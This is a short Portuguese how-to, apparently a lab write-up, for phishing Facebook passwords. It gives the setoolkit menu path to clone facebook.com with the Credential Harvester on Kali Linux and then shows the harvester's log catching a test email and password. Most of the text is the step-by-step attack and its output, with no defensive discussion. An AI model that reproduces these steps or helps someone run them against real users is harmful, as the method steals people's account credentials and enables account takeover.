# Phishing para captura de senhas do Facebook

### Ferramentas

- Kali Linux
- setoolkit

### Configurando o Phishing no Kali Linux

- Acesso root: ``` sudo su ```
- Iniciando o setoolkit: ``` setoolkit ```
- Tipo de ataque: ``` Social-Engineering Attacks ```
- Vetor de ataque: ``` Web Site Attack Vectors ```
- Método de ataque: ```Credential Harvester Attack Method ```
- Método de ataque: ``` Site Cloner ```
- Obtendo o endereço da máquina: ``` ifconfig ```
- URL para clone: http://www.facebook.com

### Resutados

![Captura de tela 2025-01-18 090251](https://github.com/user-attachments/assets/034b26f5-e42b-4726-acac-fe6b2380ff54)




















192.168.15.9 - - [18/Jan/2025 07:01:18] "GET / HTTP/1.1" 200 -
192.168.15.9 - - [18/Jan/2025 07:01:22] "GET /favicon.ico HTTP/1.1" 404 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryzf1msDJYR6cA5O0v                                                	 
Content-Disposition: form-data; name="ts"                                                                              	 
                                                                                                                       	 
1737201689007                                                                                                          	 
------WebKitFormBoundaryzf1msDJYR6cA5O0v                                                                               	 
Content-Disposition: form-data; name="q"                                                                               	 
                                                                                                                       	 
[{"app_id":"256281040558","posts":"xQ2AW1siZmFsY286b2RzX3dlYl9iYXRjaCIseyJlIjoie1wiBRAkXCI6e1wiNzE3MwkKMGVudGl0aWVzLmZmX2oFOAAuATyQdGltZV9zcGVudF9iaXRfYXJyYXkuMjU2MjgxMDQwNTU4LjAuQxFDLHZlbnQubG9nZ2VkXAVfHG5cIjoxLFwiAQ8cbnVsbH0sXCIJJmBpbmZvLnVwbG9hZF9tZXRob2QuYmFuemFpAUAsX2ltbWVkaWF0ZWx5kkkAVjsAEWAkcHJvY2Vzc2luZ35NAAmRYr4AAQH0HAEiLCJyIjoxLCJkIjoiJF58QWNiTFJWM3RSTzRCcU0xbUNINGh6S3FLQkpWU01WdE5reVJVWlFqeXhzb2dhUmx0SnA4ZXk1cm85T3J6Ml9lRHV0VE93SVo2WDBXdHlyaklMcFFqYS1SUXhyLVR8ZmQuQWNZY0I4TUEzcGtkUV91a3lSaHNhMmI0Rzdkbmt6QXZmWENmM3ZCY1VRRkdhdmpPRWlkdmRLamEzeFNDWlViWXlPUEdrZW5NNjNhVTB0bjljNmd4Y0lfbSIsInMiOiIzczUxbXM6aHJheGp6OjJwaHd4dCIsInQiOjE3MzcyMDEyMzE0OTUuOCwiYiI6WzEsMTI4XX0sMTczNzIwMTYyODc4Ny4zLDAsNTg3XSz+egJRejRiZF9wZGNfc2lnbmFsc/5wAoZwAhxjcml0aWNhbH4gAkW2XW0ROAAuSTn+agL+agL+agL+agL6agIcNTM0ODIuOCxSagIYNTA3NzQuNEFqDDcxXSxRal6kBJ3vNHNpZF9yYXdcIjpcIjNzRu8CKFwiLFwic3RhcnRfge6Bszg3MzcyMDE2MjQsXCJ0b3OJ9zBcIjpbMzk1LDgxMjhdDRkcY3VtXCI6MjANDwRpZAVmaUcAXAFYAT4EbGWhCAA2EU0Ic2VxAWT+SgT+SgT+SgTGSgQYOTA3MTQuM1bgATg4ODAwNS45LDAsNDIyXV0=","user":"0","webSessionId":"3s51ms:hraxjz:2phwxt","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":"snappy_base64","snappy_ms":1}]                                        	 
------WebKitFormBoundaryzf1msDJYR6cA5O0v-- 

[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                                          	 
                                                                                                                       	 
                                                                                                                       	 
[*] WE GOT A HIT! Printing the output:
PARAM: jazoest=2926                                                                                                    	 
PARAM: lsd=AVprO2H3Mmo                                                                                                 	 
PARAM: display=                                                                                                        	 
PARAM: isprivate=                                                                                                      	 
PARAM: return_session=                                                                                                 	 
POSSIBLE USERNAME FIELD FOUND: skip_api_login=                                                                         	 
PARAM: signed_next=                                                                                                    	 
PARAM: trynum=1                                                                                                        	 
PARAM: timezone=                                                                                                       	 
PARAM: lgndim=                                                                                                         	 
PARAM: lgnrnd=035336_s87N                                                                                              	 
PARAM: lgnjs=n                                                                                                         	 
POSSIBLE USERNAME FIELD FOUND: email=teste@teste.com <--------------------- Login                                                                  	 
POSSIBLE PASSWORD FIELD FOUND: pass=teste <--------------------- Senha                                                            	 
POSSIBLE USERNAME FIELD FOUND: login=1                                                                                 	 
PARAM: prefill_contact_point=                                                                                          	 
PARAM: prefill_source=                                                                                                 	 
PARAM: prefill_type=                                                                                                   	 
PARAM: first_prefill_source=                                                                                           	 
PARAM: first_prefill_type=                                                                                             	 
PARAM: had_cp_prefilled=false                                                                                          	 
POSSIBLE PASSWORD FIELD FOUND: had_password_prefilled=false                                                            	 
PARAM: ab_test_data=                                                                                                   	 
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.  

